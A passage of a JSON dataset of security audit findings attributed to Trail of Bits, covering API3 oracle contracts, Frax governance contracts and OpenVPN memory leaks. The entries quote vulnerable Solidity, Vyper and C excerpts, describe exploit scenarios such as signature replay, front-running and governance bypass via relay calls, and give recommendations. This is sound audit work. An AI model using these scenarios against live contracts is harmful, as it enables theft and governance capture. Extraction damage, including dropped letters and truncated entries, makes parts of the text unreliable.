storeSubscription with the same arguments as Alice but moves the last byte of the parameters argument to the beginning of the conditions argument. As a result, the Airnode will no longer report API results to Alices smart contract. Recommendations Short term, use abi.encode instead of abi.encodePacked . Long term, carefully review the Solidity documentation , particularly the Warning sections regarding the pitfalls of abi.encodePacked .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The API3 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the API3 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Decisions to opt out of a monetization scheme are irreversible ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The API3 protocol implements two on-chain monetization schemes. If an Airnode owner decides to opt out of a scheme, the Airnode will not receive additional token payments or deposits (depending on the scheme). Although the documentation states that Airnodes can opt back in to a scheme, the current implementation does not allow it. /// @notice If the Airnode is participating in the scheme implemented by /// the contract: /// Inactive: The Airnode is not participating, but can be made to /// participate by a mantainer /// Active: The Airnode is participating /// OptedOut: The Airnode actively opted out, and cannot be made to /// participate unless this is reverted by the Airnode mapping(address => AirnodeParticipationStatus) public override airnodeToParticipationStatus; Figure 3.1: RequesterAuthorizerWhitelisterWithToken.sol#L59-L68 /// @notice Sets Airnode participation status /// @param airnode Airnode address /// @param airnodeParticipationStatus Airnode participation status function setAirnodeParticipationStatus( address airnode, AirnodeParticipationStatus airnodeParticipationStatus ) external override onlyNonZeroAirnode(airnode) { if (msg.sender == airnode) { require( airnodeParticipationStatus == AirnodeParticipationStatus.OptedOut, \"Airnode can only opt out\" ); } else { [...] Figure 3.2: RequesterAuthorizerWhitelisterWithToken.sol#L229-L242 Exploit Scenario Bob, an Airnode owner, decides to temporarily opt out of a scheme, believing that he will be able to opt back in; however, he later learns that that is not possible and that his Airnode will be unable to accept any new requesters. Recommendations Short term, adjust the setAirnodeParticipationStatus function to allow Airnodes that have opted out of a scheme to opt back in. Long term, write extensive unit tests that cover all of the expected pre- and postconditions. Unit tests could have uncovered this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Depositors can front-run request-blocking transactions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "A depositor can front-run a request-blocking transaction and withdraw his or her deposit. The RequesterAuthorizerWhitelisterWithTokenDeposit contract enables a user to indenitely whitelist a requester by depositing tokens on behalf of the requester. A manager or an address with the blocker role can call setRequesterBlockStatus or setRequesterBlockStatusForAirnode with the address of a requester to block that user from submitting requests; as a result, any user who deposited tokens to whitelist the requester will be blocked from withdrawing the deposit. However, because one can execute a withdrawal immediately, a depositor could monitor the transactions and call withdrawTokens to front-run a blocking transaction. Exploit Scenario Eve deposits tokens to whitelist a requester. Because the requester then uses the system maliciously, the manager blacklists the requester, believing that the deposited tokens will be seized. However, Eve front-runs the transaction and withdraws the tokens. Recommendations Short term, implement a two-step withdrawal process in which a depositor has to express his or her intention to withdraw a deposit and the funds are then unlocked after a waiting period. Long term, analyze all possible front-running risks in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Incompatibility with non-standard ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The RequesterAuthorizerWhitelisterWithTokenPayment and RequesterAuthorizerWhitelisterWithTokenDeposit contracts are meant to work with any ERC20 token. However, several high-prole ERC20 tokens do not correctly implement the ERC20 standard. These include USDT, BNB, and OMG, all of which have a large market cap. The ERC20 standard denes two transfer functions, among others:  transfer(address _to, uint256 _value) public returns (bool success)  transferFrom(address _from, address _to, uint256 _value) public returns (bool success) These high-prole ERC20 tokens do not return a boolean when at least one of the two functions is executed. As of Solidity 0.4.22, the size of return data from external calls is checked. As a result, any call to the transfer or transferFrom function of an ERC20 token with an incorrect return value will fail. Exploit Scenario Bob deploys the RequesterAuthorizerWhitelisterWithTokenPayment contract with USDT as the token. Alice wants to pay for a requester to be whitelisted and calls payTokens , but the transferFrom call fails. As a result, the contract is unusable. Recommendations Short term, consider using the OpenZeppelin SafeERC20 library or adding explicit support for ERC20 tokens with incorrect return values. Long term, adhere to the token integration best practices outlined in appendix C .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Compromise of a single oracle enables limited control of the dAPI value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "By compromising only one oracle, an attacker could gain control of the median price of a dAPI and set it to a value within a certain range. The dAPI value is the median of all values provided by the oracles. If the number of oracles is odd (i.e., the median is the value in the center of the ordered list of values), an attacker could skew the median, setting it to a value between the lowest and highest values submitted by the oracles. Exploit Scenario There are three available oracles: O 0 , with a price of 603; O 1 , with a price of 598; and O 2 , which has been compromised by Eve. Eve is able to set the median price to any value in the range [598 , 603] . Eve can then turn a prot by adjusting the rate when buying and selling assets. Recommendations Short term, be mindful of the fact that there is no simple x for this issue; regardless, we recommend implementing o-chain monitoring of the DapiServer contracts to detect any suspicious activity. Long term, assume that an attacker may be able to compromise some of the oracles. To mitigate a partial compromise, ensure that dAPI value computations are robust.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The execution of yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. DapiServer beacon data is accessible to all users ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The lack of access controls on the conditionPspDapiUpdate function could allow an attacker to read private data on-chain. The dataPoints[] mapping contains private data that is supposed to be accessible on-chain only by whitelisted users. However, any user can call conditionPspDapiUpdate , which returns a boolean that depends on arithmetic over dataPoint : /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters /// @dev This method does not allow the caller to indirectly read a dAPI, /// which is why it does not require the sender to be a void signer with /// zero address. [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 8.1: dapis/DapiServer.sol:L468-L502 An attacker could abuse this function to deduce one bit of data per call (to determine, for example, whether a users account should be liquidated). An attacker could also automate the process of accessing one bit of data to extract a larger amount of information by using a mechanism such as a dichotomic search. An attacker could therefore infer the value of dataPoin t directly on-chain. Exploit Scenario Eve, who is not whitelisted, wants to read a beacon value to determine whether a certain users account should be liquidated. Using the code provided in appendix E , she is able to conrm that the beacon value is greater than or equal to a certain threshold. Recommendations Short term, implement access controls to limit who can call conditionPspDapiUpdate . Long term, document all read and write operations related to dataPoint , and highlight their access controls. Additionally, consider implementing an o-chain monitoring system to detect any suspicious activity.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Misleading function name ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The conditionPspDapiUpdate function always updates the dataPoints storage variable (by calling updateDapiWithBeacons ), even if the function returns false (i.e., the condition for updating the variable is not met). This contradicts the code comment and the behavior implied by the functions name. /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 9.1: dapis/DapiServer.sol#L468-L502 Recommendations Short term, revise the documentation to inform users that a call to conditionPspDapiUpdate will update the dAPI even if the function returns false . Alternatively, develop a function similar to updateDapiWithBeacons that returns the updated value without actually updating it. Long term, ensure that functions names reect the implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Race condition in FraxGovernorOmega target validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "The FraxGovernorOmega contract is intended for carrying out day-to-day operations and less sensitive proposals that do not adjust system governance parameters. Proposals directly aecting system governance are managed in the FraxGovernorAlpha contract, which has a much higher quorum requirement (40%, compared with FraxGovernorOmega s 4% quorum requirement). When a new proposal is submitted to the FraxGovernorOmega contract through the propose or addTransaction function, the target address of the proposal is checked to prevent proposals from interacting with sensitive functions in allowlisted safes outside of the higher quorum ow (gure 1.1). However, if a proposal to allowlist a new safe is pending in FraxGovernorAlpha , and another proposal that interacts with the pending safe is preemptively submitted through FraxGovernorOmega.propose , the proposal would pass this check, as the new safe would not yet have been added to the allowlist. /// @notice The ```propose``` function is similar to OpenZeppelin's ```propose()``` with minor changes /// @dev Changes include: Forbidding targets that are allowlisted Gnosis Safes /// @return proposalId Proposal ID function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } Figure 1.1: The target validation logic in the FraxGovernorOmega contracts propose function This issue provides a short window of time in which a proposal to update governance parameters that is submitted through FraxGovernorOmega could pass with the contracts 4% quorum, rather than needing to go through FraxGovernorAlpha and its 40% quorum, as intended. Such an exploit would also require cooperation from the safe owners to execute the approved transaction. As the vast majority of operations in the FraxGovernorOmega process will be optimistic proposals, the community may not monitor the contract as comprehensively as FraxGovernorAlpha , and a minority group of coordinated veFXS holders could take advantage of this loophole. Exploit Scenario A FraxGovernorAlpha proposal to add a new Gnosis Safe to the allowlist is being voted on. In anticipation of the proposals approval, the new safe owner prepares and signs a transaction on this new safe for a contentious or previously vetoed action. Alice, a veFXS holder, uses FraxGovernorOmega.propose to initiate a proposal to approve the hash of this transaction in the new safe. Alice coordinates with enough other interested veFXS holders to reach the required quorum on the proposal. The proposal passes, and the new safe owner is able to update governance parameters without the consensus of the community. Recommendations Short term, add additional validation to the end of the proposal lifecycle to detect whether the target has become an allowlisted safe. Long term, when designing new functionality, consider how this type of time-of-check to time-of-use mismatch could aect the system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Vulnerable project dependency ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "Although dependency scans did not uncover a direct threat to the project codebase, npm audit identied a dependency with a known vulnerability, the yaml library. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the project system as a whole. The output detailing the identied issue is provided below: Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Replay protection missing in castVoteWithReasonAndParamsBySig ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "The castVoteWithReasonAndParamsBySig function does not include a voter nonce, so transactions involving the function can be replayed by anyone. Votes can be cast through signatures by encoding the vote counts in the params argument. function castVoteWithReasonAndParamsBySig ( uint256 proposalId , uint8 support , string calldata reason, bytes memory params, uint8 v , bytes32 r , bytes32 s ) public virtual override returns ( uint256 ) { address voter = ECDSA.recover( _hashTypedDataV4( keccak256 ( abi.encode( EXTENDED_BALLOT_TYPEHASH, proposalId, support, keccak256 ( bytes (reason)), keccak256 (params) ) ) ), v, r, s ); return _castVote(proposalId, voter, support, reason, params); } Figure 3.1: The castVoteWithReasonAndParamsBySig function does not include a nonce. ( Governor.sol#L508-L535 ) The castVoteWithReasonAndParamsBySig function calls the _countVoteFractional function in the GovernorCountingFractional contract, which keeps track of partial votes. Unlike _countVoteNominal , _countVoteFractional can be called multiple times, as long as the voters total voting weight is not exceeded. Exploit Scenario Alice has 100,000 voting power. She signs a message, and a relayer calls castVoteWithReasonAndParamsBySig to vote for one yes and one abstain. Eve sees this transaction on-chain and replays it for the remainder of Alices voting power, casting votes that Alice did not intend to. Recommendations Short term, either include a voter nonce for replay protection or modify the _countVoteFractional function to require that _proposalVotersWeightCast[proposalId][account] equals 0 , which would allow votes to be cast only once. Long term, increase the test coverage to include cases of signature replay.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Ability to lock any users tokens using deposit_for ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "The deposit_for function can be used to lock anyone's tokens given sucient token approvals and an existing lock. @external @nonreentrant ( 'lock' ) def deposit_for (_addr: address, _value: uint256): \"\"\" @notice Deposit `_value` tokens for `_addr` and add to the lock @dev Anyone (even a smart contract) can deposit for someone else, but cannot extend their locktime and deposit for a brand new user @param _addr User's wallet address @param _value Amount to add to user's lock \"\"\" _locked: LockedBalance = self .locked[_addr] assert _value > 0 # dev: need non-zero value assert _locked.amount > 0 , \"No existing lock found\" assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\" self ._deposit_for(_addr, _value, 0 , self .locked[_addr], DEPOSIT_FOR_TYPE) Figure 4.1: The deposit_for function can be used to lock anyones tokens. ( test/veFXS.vy#L458-L474 ) The same issue is present in the veCRV contract for the CRV token, so it may be known or intentional. Exploit Scenario Alice gives unlimited FXS token approval to the veFXS contract. Alice wants to lock 1 FXS for 4 years. Bob sees that Alice has 100,000 FXS and locks all of the tokens for her. Alice is no longer able to access her 100,000 FXS. Recommendations Short term, make users aware of the issue in the existing token contract. Only present the user with exact approval limits when locking FXS.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. The relay function can be used to call critical safe functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "The relay function of the FraxGovernorOmega contract supports arbitrary calls to arbitrary targets and can be leveraged in a proposal to call sensitive functions on the Gnosis Safe. function relay ( address target , uint256 value , bytes calldata data) external payable virtual onlyGovernance { ( bool success , bytes memory returndata) = target.call{value: value}(data); Address.verifyCallResult(success, returndata, \"Governor: relay reverted without message\" ); } Figure 5.1: The relay function inherited from Governor.sol The FraxGovernorOmega contract checks proposed transactions to ensure they do not target critical functions on the Gnosis Safe contract outside of the more restrictive FraxGovernorAlpha ow. function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } proposalId = _propose({ targets: targets, values: values, calldatas: calldatas, description: description }); } Figure 5.2: The propose function of FraxGovernorOmega.sol A malicious user can hide a call to the Gnosis Safe by wrapping it in a call to the relay function. There are no further restrictions on the target contract argument, which means the relay function can be called with calldata that targets the Gnosis Safe contract. Exploit Scenario Alice, a veFXS holder, submits a transaction to the propose function. The targets array contains the FraxGovernorOmega address, and the corresponding calldatas array contains an encoded call to its relay function. The encoded call to the relay function has a target address of an allowlisted Gnosis Safe and an encoded call to its approveHash function with a payload of a malicious transaction hash. Due to the low quorum threshold on FraxGovernorOmega and the shorter voting period, Alice is able to push her malicious transaction through, and it is approved by the safe even though it should not have been. Recommendations Short term, add a check to the relay function that prevents it from targeting addresses of allowlisted safes. Long term, carefully examine all cases of user-provided inputs, especially where arbitrary targets and calldata can be submitted, and expand the unit tests to account for edge cases specic to the wider system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Votes can be delegated to contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "Votes can be delegated to smart contracts. This behavior contrasts with the fact that FXS tokens can be locked only in whitelisted contracts. Allowing votes to be delegated to smart contracts could lead to unexpected behavior. By default, smart contracts are unable to gain voting power; to gain voting power, they need to be explicitly whitelisted by the Frax Finance team in the veFXS contract. @internal def assert_not_contract (addr: address): \"\"\" @notice Check if the call is from a whitelisted smart contract, revert if not @param addr Address to be checked \"\"\" if addr != tx.origin: checker: address = self .smart_wallet_checker if checker != ZERO_ADDRESS: if SmartWalletChecker(checker).check(addr): return raise \"Smart contract depositors not allowed\" Figure 6.1: The contract check in veFXS.vy This is the intended design of the voting escrow contract, as allowing smart contracts to vote would enable wrapped tokens and bribes. The VeFxsVotingDelegation contract enables users to delegate their voting power to other addresses, but it does not contain a check for smart contracts. This means that smart contracts can now hold voting power, and the team is unable to disallow this. function _delegate ( address delegator , address delegatee ) internal { // Revert if delegating to self with address(0), should be address(delegator) if (delegatee == address ( 0 )) revert IVeFxsVotingDelegation.IncorrectSelfDelegation(); IVeFxsVotingDelegation.Delegation memory previousDelegation = $delegations[delegator]; // This ensures that checkpoints take effect at the next epoch uint256 checkpointTimestamp = (( block.timestamp / 1 days) * 1 days) + 1 days; IVeFxsVotingDelegation.NormalizedVeFxsLockInfo memory normalizedDelegatorVeFxsLockInfo = _getNormalizedVeFxsLockInfo({ delegator: delegator, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerFromPreviousDelegate({ previousDelegation: previousDelegation, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerToNewDelegate({ newDelegate: delegatee, delegatorVeFxsLockInfo: normalizedDelegatorVeFxsLockInfo, checkpointTimestamp: checkpointTimestamp }); // ... } Figure 6.2: The _delegate function in VeFxsVotingDelegation.sol Exploit Scenario Eve sets up a contract that accepts delegated votes in exchange for rewards. The contract ends up owning a majority of the FXS voting power. Recommendations Short term, consider whether smart contracts should be allowed to hold voting power. If so, document this fact; if not, add a check to the VeFxsVotingDelegation contract to ensure that addresses receiving delegated voting power are not smart contracts . Long term, when implementing new features, consider the implications of adding them to ensure that they do not lift constraints that were placed beforehand.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of public documentation regarding voting power expiry ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "The user documentation concerning the calculation of voting power is unclear. The Frax-Governance specication sheet provided by the Frax Finance team states, Voting power goes to 0 at veFXS lock expiration time, this is dierent from veFXS.getBalance() which will return the locked amount of FXS after the lock has expired. This statement is in line with the codes behavior. The _calculateVotingWeight function in the VeFxsVotingDelegation contract does not return the locked veFXS balance once a lock has expired. /// @notice The ```_calculateVotingWeight``` function calculates ```account```'s voting weight. Is 0 if they ever delegated and the delegation is in effect. /// @param voter Address of voter /// @param timestamp A block.timestamp, typically corresponding to a proposal snapshot /// @return votingWeight Voting weight corresponding to ```account```'s veFXS balance function _calculateVotingWeight ( address voter , uint256 timestamp ) internal view returns ( uint256 ) { // If lock is expired they have no voting weight if (VE_FXS.locked(voter).end <= timestamp) return 0 ; uint256 firstDelegationTimestamp = $delegations[voter].firstDelegationTimestamp; // Never delegated OR this timestamp is before the first delegation by account if (firstDelegationTimestamp == 0 || timestamp < firstDelegationTimestamp) { try VE_FXS.balanceOf({ addr: voter, _t: timestamp }) returns ( uint256 _balance ) { return _balance; } catch {} } return 0 ; } Figure 7.2: The function that calculates the voting weight in VeFxsVotingDelegation.sol If a voters lock has expired or was never created, the short-circuit condition returns zero voting power. This behavior contrasts with the veFxs.balanceOf function, which would return the users last locked FXS balance. @external @view def balanceOf (addr: address, _t: uint256 = block.timestamp) -> uint256: \"\"\" @notice Get the current voting power for `msg.sender` @dev Adheres to the ERC20 `balanceOf` interface for Aragon compatibility @param addr User wallet address @param _t Epoch time to return voting power at @return User voting power \"\"\" _epoch: uint256 = self .user_point_epoch[addr] if _epoch == 0 : return 0 else : last_point: Point = self .user_point_history[addr][_epoch] last_point.bias -= last_point.slope * convert(_t - last_point.ts, int128) if last_point.bias < 0 : last_point.bias = 0 unweighted_supply: uint256 = convert(last_point.bias, uint256) # Original from veCRV weighted_supply: uint256 = last_point.fxs_amt + (VOTE_WEIGHT_MULTIPLIER * unweighted_supply) return weighted_supply Figure 7.1: The balanceOf function in veFXS.vy This divergence should be clearly documented in the code and should be reected in Frax Finances public-facing documentation, which does not mention the fact that an expired lock does not hold any voting power: Each veFXS has 1 vote in governance proposals. Staking 1 FXS for the maximum time, 4 years, would generate 4 veFXS. This veFXS balance itself will slowly decay down to 1 veFXS after 4 years, [...]. Exploit Scenario Alice buys FXS to be able to vote on a proposal. She is not aware that she is required to create a lock (even if expired) to have any voting power at all. She is unable to vote for the proposal. Recommendations Short term, modify the VeFxsVotingDelegation contract to reect the desired voting power curve and/or document whether this is intended behavior. Long term, make sure to keep public-facing documentation up to date when changes are made.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Spamming risk in propose functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf",
        "body": "Anyone with enough veFXS tokens to meet the proposal threshold can submit an unbounded number of proposals to both the FraxGovernorAlpha and FraxGovernorOmega contracts. The only requirement for submitting proposals is that the msg.sender address must have a balance of veFXS tokens larger than the _proposalThreshold value. Once that requirement is met, a user can submit as many proposals as they would like. A large volume of proposals may create diculties for o-chain monitoring solutions and user-interface interactions. function _requireSenderAboveProposalThreshold() internal view { if (_getVotes(msg.sender, block.timestamp - 1, \"\") < proposalThreshold()) { revert SenderVotingWeightBelowProposalThreshold(); } } Figure 8.1: The _requireSenderAboveProposalThreshold function, called by the propose function ( FraxGovernorBase.sol#L104-L108 ) Exploit Scenario Mallory has 100,000 voting power. She submits one million proposals with small but unique changes to the description eld of each one. The system saves one million unique proposals and emits one million ProposalCreated events. Front-end components and o-chain monitoring systems are spammed with large quantities of data. Recommendations Short term, track and limit the number of proposals a user can have active at any given time. Long term, consider cases of user interactions beyond just the intended use cases for potential malicious behavior. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Broken fuzzing harnesses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "OpenVPN fuzzing is performed through the oss-fuzz project; however, the build has been broken since November 8, 2022, and the code has not been continuously fuzzed via oss-fuzz since that time (gure 1.1). We moved the fuzzing harnesses from the oss-fuzz project to the OpenVPN repository and xed them in OpenVPN/openvpn#208. However, the oss-fuzz repository still needs to be updated in order to use the buildable fuzzing harnesses. After measuring the code coverage these harnesses achieve, some were found to cover certain paths (case 0 in a switch statement) more than others, which can slow the process of obtaining proper code coverage. For example, the fuzz_buffer harness tests the buf_clear function substantially more often than any other cases it was supposed to test (gure 1.2). This happened due to bias in the return value of the fuzz_randomizer_get_int function, which we detail in Appendix E. Figure 1.1: The OpenVPN project's oss-fuzz build status (https://oss-fuzz-build-logs.storage.googleapis.com/index.html#openvpn). Figure 1.2: A screenshot of code coverage report for the fuzz_buffer harness. The columns represent: line number, number of hits by the fuzzer's corpus inputs, and the code lines. The rst case (value 0) is hit more than 1,800 times, while the other cases are hit around tens of times. Recommendations Short term, build the updated fuzzing harnesses on the CI to ensure updates do not break their ability to build successfully. Update the OpenVPN project in the oss-fuzz repository to use the updated harnesses. Long term, establish procedures for periodically reviewing and improving the coverage of existing fuzzing harnesses.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Certain error paths do not free allocated memory leading to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "There are three cases where resources are not freed appropriately during error handling. These resources are allocated by either argv_new or gc_new (along with operations performed on the returned gc object which triggers the actual allocation since gc_new itself does not allocate):  In the verify_user_pass_script function, the gc, argv, and tmp_file resources are not freed if the key_state_gen_auth_control_files call fails (gure 2.1). The code should jump to the done label after rst setting the retval to OPENVPN_PLUGIN_FUNC_ERROR.  In the get_console_input_systemd function, the allocation performed in argv_new will cause a memory leak due to lack of argv_free when the openvpn_popen call fails (gure 2.1).  In the set_lladdr function, if the target is neither Linux or Solaris, the argv resource will be leaked due to lack of argv_free call (gure 2.3). verify_user_pass_script(...) { struct gc_arena gc = gc_new(); struct argv argv = argv_new(); ... argv_parse_cmd(&argv, session->opt->auth_user_pass_verify_script); if (session->opt->auth_user_pass_verify_script_via_file) { struct status_output *so; tmp_file = platform_create_temp_file(session->opt->tmp_dir, \"up\", &gc); if (tmp_file) { ... argv_printf_cat(&argv, \"%s\", tmp_file); } } else { ... } /* generate filename for deferred auth control file */ if (!key_state_gen_auth_control_files(&ks->script_auth, session->opt)) { msg(D_TLS_ERRORS, \"TLS Auth Error (%s): \" \"could not create deferred auth control file\", __func__); return OPENVPN_PLUGIN_FUNC_ERROR; } ... done: if (tmp_file && strlen(tmp_file) > 0) { platform_unlink(tmp_file); } argv_free(&argv); gc_free(&gc); return retval; } Figure 2.1: openvpn/src/openvpn/ssl_verify.c#L1319-L1418 static bool get_console_input_systemd(...) { ... struct argv argv = argv_new(); ... if ((std_out = openvpn_popen(&argv, NULL)) < 0) { return false; } Figure 2.2: openvpn/src/openvpn/console_systemd.c#L63-L78 int set_lladdr(...) { #if defined(TARGET_LINUX) ... #else /* if defined(TARGET_LINUX) */ struct argv argv = argv_new(); #if defined(TARGET_SOLARIS) ... #else /* if defined(TARGET_SOLARIS) */ msg(M_WARN, \"Sorry, but I don't know how to configure link layer addresses on this operating system.\"); return -1; #endif /* if defined(TARGET_SOLARIS) */ Figure 2.3: openvpn/src/openvpn/lladdr.c#L35-L58 This issue can be found with custom static analysis queries with CodeQL or by querying the code with Weggli, as demonstrated in Appendices D.2 and D.3. Recommendations Short term, x the code paths that leak memory by calling the appropriate memory-freeing functions. In the case of the verify_user_pass_script function, set retval = OPENVPN_PLUGIN_FUNC_ERROR and jump to the done label so that all the resources are freed up before the function returns. In the other two cases, call argv_free(&argv) before the return statements. Long term, create CodeQL rules to run on your CI/CD pipeline to ensure that your team is alerted if any new potential vulnerabilities surface during development of the project. 4. Stack bu\u0000er out-of-bounds read in command line options parsing Severity: Informational Diculty: High Type: Undened Behavior Finding ID: TOB-OVPN-4 Target: src/openvpn/options.h",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Support of weak proxy authentication algorithm ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
